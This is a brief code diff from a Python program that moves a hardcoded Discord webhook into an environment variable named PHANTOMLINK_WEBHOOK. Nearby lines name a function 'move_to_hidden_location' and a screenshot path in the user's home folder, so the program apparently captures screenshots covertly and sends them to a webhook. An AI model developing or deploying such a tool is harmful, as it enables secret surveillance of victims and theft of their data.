@@ -74,7 +74,8 @@ def move_to_hidden_location():
 
 
 
-DISCORD_WEBHOOK = "***REMOVED***"
+# Webhook must be supplied via env; never hardcode a live webhook URL in source.
+DISCORD_WEBHOOK = os.getenv("PHANTOMLINK_WEBHOOK", "")
 FILE_PATH = os.path.join(os.path.expanduser("~"), "screenshot.png")
 
 
